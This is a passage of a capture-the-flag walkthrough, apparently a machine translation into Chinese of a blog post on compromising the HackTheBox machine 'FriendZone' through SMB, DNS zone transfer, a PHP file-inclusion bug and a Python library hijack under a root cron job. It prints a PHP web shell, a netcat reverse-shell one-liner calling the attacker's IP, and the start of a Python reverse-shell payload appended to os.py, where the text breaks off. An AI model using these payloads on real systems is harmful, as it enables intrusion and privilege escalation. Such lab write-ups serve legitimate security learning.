# 高温透射电：朋友圈

[0xdf.gitlab.io](https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#box-info)0xdf黑客的东西

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffriendzone-cover.jpg)FriendZone是一个相对容易的盒子，但就简单的盒子而言，它有很多枚举和垃圾巨魔需要分类。在所有枚举中，我将找到一个带有LFI的php页面，并使用SMB读取页面源代码并上传网页外壳。我将使用数据库配置文件中的信誉向下一个用户进行更新，然后使用可写的python模块来利用调用python脚本的根cron作业。

## 箱子信息

名字

[朋友圈](https://www.hackthebox.eu/home/machines/profile/173) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-friendzone.png) 

发行日期

[09 2月 2019](https://twitter.com/hackthebox_eu/status/1093438619312898048)

停用日期

13 7月 2019

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffriendzone-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ffriendzone-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 48分钟 46秒。[![亚当姆](https://image.cubox.pro/article/2022091820195947721/23065.jpg)](https://www.hackthebox.eu/home/users/profile/2571)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 04分钟 31秒。[![否](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F21927)](https://www.hackthebox.eu/home/users/profile/21927)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F17292)](https://www.hackthebox.eu/home/users/profile/17292)-

## 侦察

### n地图

打开了许多端口，包括 FTP （21）、固态混合存储 （22）、DNS （53）、HTTP （80）、HTTPS （443） 和中小型企业 （139/445）：

    root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.123
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:52 EST
    Nmap scan report for 10.10.10.123
    Host is up (0.018s latency).
    Not shown: 65528 closed ports
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    53/tcp  open  domain
    80/tcp  open  http
    139/tcp open  netbios-ssn
    443/tcp open  https
    445/tcp open  microsoft-ds
    
    Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
    
    root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.123
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:53 EST
    Warning: 10.10.10.123 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.123
    Host is up (0.020s latency).
    Not shown: 65455 open|filtered ports, 78 closed ports
    PORT    STATE SERVICE
    53/udp  open  domain
    137/udp open  netbios-ns
    
    Nmap done: 1 IP address (1 host up) scanned in 72.92 seconds
    
    root@kali# nmap -sC -sV -p 21,22,53,80,137,139,443,445 -oA nmap/scripts 10.10.10.123
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 16:55 EST
    Nmap scan report for 10.10.10.123
    Host is up (0.017s latency).
    
    PORT    STATE  SERVICE     VERSION
    21/tcp  open   ftp         vsftpd 3.0.3
    22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
    |   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
    |_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
    53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
    | dns-nsid:
    |_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
    80/tcp  open   http        Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Friend Zone Escape software
    137/tcp closed netbios-ns
    139/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    443/tcp open   ssl/http    Apache httpd 2.4.29
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: 404 Not Found
    | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
    | Not valid before: 2018-10-05T21:02:30
    |_Not valid after:  2018-11-04T21:02:30
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |_  http/1.1
    445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
    Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    |_clock-skew: mean: -48m13s, deviation: 1h09m16s, median: -8m14s
    |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
    |   Computer name: friendzone
    |   NetBIOS computer name: FRIENDZONE\x00
    |   Domain name: \x00
    |   FQDN: friendzone
    |_  System time: 2019-02-11T23:47:26+02:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2019-02-11 16:47:26
    |_  start_date: N/A
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds
    

基于开放SSH和阿帕奇版本，这似乎是Ubuntu 18.04。

我会仔细注意 TLS 证书中的域。`commonName=friendzone.red`

### 中小型企业 - TCP 445 / 139

#### 枚举共享

我将转到快速查看共享和我的权限：`smbmap`

    root@kali# smbmap -H 10.10.10.123                                                                                                                                             [100/100]
    [+] Finding open SMB ports....                                       
    [+] Guest SMB session established on 10.10.10.123...              
    [+] IP: 10.10.10.123:445        Name: friendzone.red                                           
            Disk                                                    Permissions
            ----                                                    -----------
            print$                                                  NO ACCESS
            Files                                                   NO ACCESS
            general                                                 READ ONLY
            Development                                             READ, WRITE
            IPC$                                                    NO ACCESS
    

我可以从使用空会话（或无身份验证）中获得类似的列表（没有权限）并列出：`smbclient``-N``-L`

    root@kali# smbclient -N -L //10.10.10.123
    
            Sharename       Type      Comment
            ---------       ----      -------
            print$          Disk      Printer Drivers
            Files           Disk      FriendZone Samba Server Files /etc/Files
            general         Disk      FriendZone Samba Server Files
            Development     Disk      FriendZone Samba Server Files
            IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
    Reconnecting with SMB1 for workgroup listing.
    
            Server               Comment
            ---------            -------
    
            Workgroup            Master
            ---------            -------
            WORKGROUP            FROLIC
    

有趣的是，将上的评论视为 .我可以猜到这一点，也许并遵循相同的模式。但我不必猜测，因为这里还有一件事特别有用 - 脚本，.`Files``/etc/Files``general``Development``nmap``smb-enum-shares.nse`

    root@kali# nmap --script smb-enum-shares.nse -p445 10.10.10.123
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 10:22 EST
    Nmap scan report for friendzone.red (10.10.10.123)
    Host is up (0.017s latency).
    
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds
    
    Host script results:
    | smb-enum-shares:
    |   account_used: guest
    |   \\10.10.10.123\Development:
    |     Type: STYPE_DISKTREE
    |     Comment: FriendZone Samba Server Files
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\etc\Development
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.10.123\Files:
    |     Type: STYPE_DISKTREE
    |     Comment: FriendZone Samba Server Files /etc/Files
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\etc\hole
    |     Anonymous access: <none>
    |     Current user access: <none>
    |   \\10.10.10.123\IPC$:
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.10.123\general:
    |     Type: STYPE_DISKTREE
    |     Comment: FriendZone Samba Server Files
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\etc\general
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.10.123\print$:
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>
    
    Nmap done: 1 IP address (1 host up) scanned in 5.62 seconds
    

脚本输出特别巧妙的是，它告诉我目标到共享的路径（即使它有点混乱，并将 a 应用于每个字符串的开头）。这将在以后派上用场。`nmap``C:`

#### 发展

开发份额为空：

    root@kali# smbclient -N //10.10.10.123/Development                                                            
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Tue Feb 12 10:17:41 2019
      ..                                  D        0  Sun Feb 10 20:46:10 2019
    
                    9221460 blocks of size 1024. 5795128 blocks available
    

#### 常规

常规共享只有一个文件，但看起来会很有用：

    root@kali# smbclient -N //10.10.10.123/general
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Wed Jan 16 15:10:51 2019
      ..                                  D        0  Sun Feb 10 20:46:10 2019
      creds.txt                           N       57  Tue Oct  9 19:52:42 2018
    
                    9221460 blocks of size 1024. 5795120 blocks available
    smb: \> get creds.txt
    getting file \creds.txt of size 57 as creds.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
    

    root@kali# cat creds.txt 
    creds for the admin THING:
    
    admin:WORKWORKHhallelujah@#
    

### http - 友区红色 - TCP 80

#### 网站

该网站没有太多内容，除了提供另一个域名“朋友区门户.red”：

![1549924241766](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924241766.png)

#### 戈克斯特

跑步还有两条路，但都是巨魔：`gobuster`

    root@kali# gobuster -u http://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php -t 20
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://friendzone.red/
    [+] Threads      : 20
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : txt,php
    [+] Timeout      : 10s
    =====================================================
    2019/02/11 17:11:05 Starting gobuster
    =====================================================
    /wordpress (Status: 301)
    /robots.txt (Status: 200)
    =====================================================
    2019/02/11 17:15:59 Finished
    =====================================================
    

`robots.txt`只是一个巨魔：

    root@kali# curl http://friendzone.red/robots.txt
    seriously ?!
    

`/wordpress`是一个空目录：

![1549924532144](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924532144.png)

### HTTPS - 朋友圈.red - TCP 443

#### 网站

HTTPS 站点与 HTTP 站点不同。主网站只是一个带有动画gif的模因：

![1549924607060](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924607060.png)

#### 戈克斯特

`gobuster`显示了另外几个路径：

    root@kali# gobuster -k -u https://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20 -x txt,php
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : https://friendzone.red/
    [+] Threads      : 20
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : txt,php
    [+] Timeout      : 10s
    =====================================================
    2019/02/11 17:16:04 Starting gobuster
    =====================================================
    /admin (Status: 301)
    /js (Status: 301)
    =====================================================
    2019/02/11 17:24:51 Finished
    =====================================================
    

`/admin`是一个空的目录，就像在http上一样：`/wordpress`

![1549924674427](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924674427.png)

`/js`里面有一些东西：

![1549924699366](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924699366.png)

转到给出一个页面：`https://friendzone.red/js/js/`

![1549924725149](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549924725149.png)

消息来源透露，它也有一些评论：

    <p>Testing some functions !</p><p>I'am trying not to break things !</p>S0s4ZGFJdjFibDE1NDk5MjIwMDJIbWt2TmtKZThr<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
    

这对我来说还没有多大意义。可能是对 DNS 区域的影射。或者它可能只是一个巨魔。

### DNS - TCP/UDP 53

TCP 仅在响应大小大于 512 字节时在 DNS 中使用。通常，这与区域传输相关联，其中服务器提供其拥有的有关域的所有信息。我可以尝试枚举 DNS，但主机正在侦听 TCP 53 这一事实表明，我应该尝试的第一件事是区域传输。

我将使用 .我将从 开始，但什么也得不到：`dig``friendzone.htb`

    root@kali# dig axfr friendzone.htb @10.10.10.123
    
    ; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzone.htb @10.10.10.123
    ;; global options: +cmd
    ; Transfer failed.
    

由于我在TLS证书中有一个域名，我将尝试：

    root@kali# dig axfr friendzone.red @10.10.10.123
    
    ; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzone.red @10.10.10.123
    ;; global options: +cmd
    friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
    friendzone.red.         604800  IN      AAAA    ::1
    friendzone.red.         604800  IN      NS      localhost.
    friendzone.red.         604800  IN      A       127.0.0.1
    administrator1.friendzone.red. 604800 IN A      127.0.0.1
    hr.friendzone.red.      604800  IN      A       127.0.0.1
    uploads.friendzone.red. 604800  IN      A       127.0.0.1
    friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
    ;; Query time: 28 msec
    ;; SERVER: 10.10.10.123#53(10.10.10.123)
    ;; WHEN: Mon Feb 11 17:20:13 EST 2019
    ;; XFR size: 8 records (messages 1, bytes 289)
    

我也可以尝试我在第一个网页上获得的域名，“朋友圈门户.red”：

    root@kali# dig axfr friendzoneportal.red @10.10.10.123
    
    ; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
    ;; global options: +cmd
    friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
    friendzoneportal.red.   604800  IN      AAAA    ::1
    friendzoneportal.red.   604800  IN      NS      localhost.
    friendzoneportal.red.   604800  IN      A       127.0.0.1
    admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
    files.friendzoneportal.red. 604800 IN   A       127.0.0.1
    imports.friendzoneportal.red. 604800 IN A       127.0.0.1
    vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
    friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
    ;; Query time: 20 msec
    ;; SERVER: 10.10.10.123#53(10.10.10.123)
    ;; WHEN: Mon Feb 11 17:29:20 EST 2019
    ;; XFR size: 9 records (messages 1, bytes 309)
    

我将更新以下各项的主机文件：

    root@kali# grep friendzone /etc/hosts
    10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
    

### 子域在 http / TCP 80

http上的所有子域似乎都回到了同一个站点。我现在就把它们留下来。

### 子域在 443

我现在还有8个域名要签出。大多数都不是很有趣，所以我将在这里总结它们：

域

评论

管理员1.友域.红色

请参阅以下部分

hr.友域.red

404 未找到

上传.友域.红色

假上传网站

朋友地带门户.red

迈克尔·杰克逊吃爆米花的文字和gif

admin.friendzoneportal.red

具有登录表单。来自SMB工作的Creds，但在登录时，消息显示“管理页面尚未开发!!!检查另一个”

files.friendzoneportal.red

404 未找到

imports.friendzoneportal.red

404 未找到

vpn.friendzoneportal.red

404 未找到

### 管理员1.友域.红色

#### 网站

该页面显示一个登录表单：

![1549988963862](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549988963862.png)

这就是SMB的信誉将有用的地方。登录时，它会返回一条消息：

![1549989022192](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549989022192.png)

#### 仪表板.php

此站点是“未经测试的应用程序”，带有一些草率的文本，包括错误消息：

![1549989060984](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549989060984.png)

如果我将建议的参数添加到URL并访问：`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`

![1549989147745](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549989147745.png)

#### 戈克斯特

此时，运行目录会很有用。我将使用php扩展运行，因为这是一个php站点：`gobuster``gobuster`

    root@kali# gobuster -k -u https://administrator1.friendzone.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : https://administrator1.friendzone.red/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Extensions   : php
    [+] Timeout      : 10s
    =====================================================
    2019/02/12 06:59:54 Starting gobuster
    =====================================================
    /images (Status: 301)
    /login.php (Status: 200)
    /dashboard.php (Status: 200)
    /timestamp.php (Status: 200)
    =====================================================
    2019/02/12 07:08:54 Finished
    =====================================================
    

所以时间戳.php是另一个页面。我可以通过访问它来检查它：

    root@kali# curl -k https://administrator1.friendzone.red/timestamp.php
    Final Access timestamp is 1549992438
    

## 壳牌作为万维数据

### 查找生命周期设置

根据上面的侦察，此页面中可能存在本地文件包含 （LFI）。这两个参数都有潜力。

#### image\_id

映像 ID，例如 是完整的文件名。我会尝试给它一个php页面，如果该文件在php中显示，它将加载该页面。不幸的是，它只是显示了一个破碎的图像：`a.jpg``include`

![1549990054660](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549990054660.png)

查看源，我看到.我可以在这里玩XSS，看看我是否可以让它加载脚本。例如，如果我设置 ，我会得到一个弹出窗口：`<img src='images/timestamp.php'>``image_id=' onerror='javascript: alert("XXS HERE");`

![1549990474028](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549990474028.png)

消息来源对此进行了解释：`<img src='images/' onerror='javascript: alert("XXS HERE");'>`

如果这是一个公共站点，我可以关闭图像标记并添加一个带有恶意站点的iframe（例如，登录对话框），然后使用来自受信任站点的URL进行网络钓鱼。但现在，我将转到第二个参数。

#### 页面名称

由于给定的示例情况是 ，并且在同一目录中有 一个，我可以假设这可能正在执行 .我可以通过让它指向其他php页面来测试这一点。`timestamp``timestamp.php``include($_GET["pagename"] . ".php")`

来访返回：`https://administrator1.friendzone.red/login.php`

![1549991359728](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549991359728.png)

如果我更改为登录，我会在底部角落看到：`pagename``login.php`

![1549991378014](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549991378014.png)

我也可以尝试引用此目录之外的页面。在上传子域上，有一个：`upload.php`

    root@kali# curl -k https://uploads.friendzone.red/upload.php
    WHAT ARE YOU TRYING TO DO HOOOOOOMAN !
    

如果我猜上传站点位于一个名为 uploads 的文件夹中，我可以通过以下方式获取它：`pagename=../uploads/upload.php`

![1549992211060](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549992211060.png)

### 阅读语言版本源代码

我可以使用此LFI通过php过滤器读取这些页面的源代码。如果我访问 ，我可以在页面上看到一个长base64字符串：`pagename=php://filter/convert.base64-encode/resource=dashboard`

![1549992353577](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549992353577.png)

解码为我提供了页面的源代码：

    <?php
    
    //echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
    //echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
    echo "<title>FriendZone Admin !</title>";
    $auth = $_COOKIE["FriendZoneAuth"];
    
    if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
     echo "<br><br><br>";
    
    echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
    echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
    
    if(!isset($_GET["image_id"])){
      echo "<br><br>";
      echo "<center><p>image_name param is missed !</p></center>";
      echo "<center><p>please enter it to show the image</p></center>";
      echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
     }else{
     $image = $_GET["image_id"];
     echo "<center><img src='images/$image'></center>";
    
     echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
     include($_GET["pagename"].".php");
     //echo $_GET["pagename"];
     }
    }else{
    echo "<center><p>You can't see the content ! , please login !</center></p>";
    }
    ?>
    

我也可以获得其他页面。例如，如果我得到，我可以看到它实际上是一个虚假的上传页面：`upload.php`

    <?php
    
    // not finished yet -- friendzone admin !
    
    if(isset($_POST["image"])){
    
    echo "Uploaded successfully !<br>";
    echo time()+3600;
    }else{
    
    echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
    
    }
    
    ?>
    

### 网络外壳

我想使用此LFI来包含一个网络外壳，以便我可以运行命令。我将使用我的 smb 访问权限将一个简单的 php 命令 shell 放入开发共享中，它告诉我是 .`nmap``/etc/Development`

    root@kali# cat cmd.php 
    <?php system($_REQUEST['cmd']); ?>
    
    root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php 0xdf.php'
    putting file cmd.php as \0xdf.php (0.6 kb/s) (average 0.6 kb/s)
    

现在，在访问时，我得到输出：`https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/0xdf&cmd=id`

![1549992654973](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1549992654973.png)

即使我不知道目录在磁盘上的位置，我也可以做一些猜测，并通过模糊测试来获得它。例如，我假设共享是一个名为 的文件夹。我将开始，它可能在根或一个级别上。因此，我将从我的框中列出一个单词列表：`Development`

    root@kali# ls -d /* > root_dirs 
    root@kali# echo "/" >> root_dirs
    

然后我可以使用以下网址：.我将使用向上移动三个级别，大概是系统根目录，然后尝试每个目录（包括 ），然后.我将添加该参数以提供一些要查找的输出。如果没有输出，则报告 0 行。我将用 隐藏它。它在以下位置找到该目录：`wfuzz``https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id``../``FUZZ``/``Development/0xdf``cmd=id``wfuzz``--hl 0``/etc`

    root@kali# wfuzz --hl 0 -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id'
    
    ********************************************************
    * Wfuzz 2.3.4 - The Web Fuzzer                         *
    ********************************************************
    
    Target: https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/0xdf&cmd=id
    Total requests: 27
    
    ==================================================================
    ID   Response   Lines      Word         Chars          Payload    
    ==================================================================
    
    000004:  C=200      1 L       40 W          403 Ch        "/etc"
    
    Total time: 0.315563
    Processed Requests: 27
    Filtered Requests: 26
    Requests/sec.: 85.56111
    

### 壳

当然，我想要一个真正的贝壳。我将使用我从[反向外壳备忘单](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)转到的转到，并访问：（记住将编码为）：`https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/0xdf&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.7 443 >/tmp/f``&``%26`

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.123.
    Ncat: Connection from 10.10.10.123:45840.
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

在 shell 升级后（， ， ， ， ， 如果询问，请输入终端类型的“屏幕”），我得到了一个完整的外壳。我可以得到用户.txt：`python -c 'import pty;pty.spawn("bash")'``ctrl-z``stty raw -echo``fg``reset`

    www-data@FriendZone:/home/friend$ cat user.txt 
    a9ed20ac...
    

## 私人：万维数据给朋友

在目录中，有所有不同站点的文件夹，以及一个sql conf文件：`/var/www/`

    www-data@FriendZone:/var/www$ ls
    admin       friendzoneportal       html             uploads
    friendzone  friendzoneportaladmin  mysql_data.conf
    
    www-data@FriendZone:/var/www$ cat mysql_data.conf 
    for development process this is the mysql creds for user friend
    
    db_user=friend
    db_pass=Agpyu12!0.213$
    db_name=FZ
    

这些信誉恰好为朋友工作。我可以：`su friend`

    www-data@FriendZone:/var/www$ su friend
    Password: 
    friend@FriendZone:/var/www$ 
    

或与他们一起ssh：

    root@kali# ssh friend@10.10.10.123
    friend@10.10.10.123's password:
    Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    
     * Canonical Livepatch is available for installation.
       - Reduce system reboots and improve kernel security. Activate at:
         https://ubuntu.com/livepatch
    You have mail.
    Last login: Mon Feb 11 23:16:53 2019 from 10.10.14.18
    friend@FriendZone:~$ 
    

## 私人：朋友到根

### 列举

#### reporter.py

我正在查看文件系统，我注意到以下脚本：`/opt/server_admin/`

    friend@FriendZone:/opt/server_admin$ ls
    reporter.py
    

它说它是不完整的，并且什么也不做：

    #!/usr/bin/python
    
    import os
    
    to_address = "admin1@friendzone.com"
    from_address = "admin2@friendzone.com"
    
    print "[+] Trying to send email to %s"%to_address
    
    #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
    
    #os.system(command)
    
    # I need to edit the script later
    # Sam ~ python developer
    

#### 克朗

我上传了[pspy](https://github.com/DominicBreuker/pspy)到目标，并注意到root每两分钟运行一次这个脚本：

    2019/02/12 15:18:01 CMD: UID=0    PID=26106  | /usr/bin/python /opt/server_admin/reporter.py 
    2019/02/12 15:18:01 CMD: UID=0    PID=26105  | /bin/sh -c /opt/server_admin/reporter.py 
    2019/02/12 15:18:01 CMD: UID=0    PID=26104  | /usr/sbin/CRON -f 
    2019/02/12 15:20:01 CMD: UID=0    PID=26109  | /usr/bin/python /opt/server_admin/reporter.py 
    2019/02/12 15:20:01 CMD: UID=0    PID=26108  | /bin/sh -c /opt/server_admin/reporter.py 
    2019/02/12 15:20:01 CMD: UID=0    PID=26107  | /usr/sbin/CRON -f 
    

#### os.py

最后，我注意到 python 模块 是可写的：`os`

    friend@FriendZone:/usr/lib/python2.7$ find -type f -writable -ls
       262202     28 -rw-rw-r--   1 friend   friend      25583 Jan 15 22:19 ./os.pyc
       282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15 22:19 ./os.py
    

### 蟒蛇图书馆劫持

拉辛在[Python图书馆劫持](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)方面有很好的文章。我可以使用以下命令来查看python路径顺序：

    friend@FriendZone:/dev/shm$ python -c 'import sys; print "\n".join(sys.path)'
    
    /usr/lib/python2.7
    /usr/lib/python2.7/plat-x86_64-linux-gnu
    /usr/lib/python2.7/lib-tk
    /usr/lib/python2.7/lib-old
    /usr/lib/python2.7/lib-dynload
    /usr/local/lib/python2.7/dist-packages
    /usr/lib/python2.7/dist-packages
    

_我认为_顶部的空行表示脚本的当前目录。

这种劫持最常见的情况是发现包含python脚本的目录是可写的。在这种情况下，我可以在旁边放一个，它会在检查之前加载在那里。在这种情况下，我实际上无法写信给 .但我可以直接写到这个模块的普通版本。`os.py``reporter.py``/usr/lib/python2.7/``/opt/server_admin/`

我将打开 中的文件，然后转到底部。在那里，我将为自己添加一个外壳：`vi`

    ...[snip]...
    def _pickle_statvfs_result(sr):
        (type, args) = sr.__reduce__()
        return (_make_statvfs_result, args)
    
    try:
        _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
                         _make_statvfs_result)
    except NameError: # statvfs_result may not exist
        pass
    
    import pty
    import socket
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
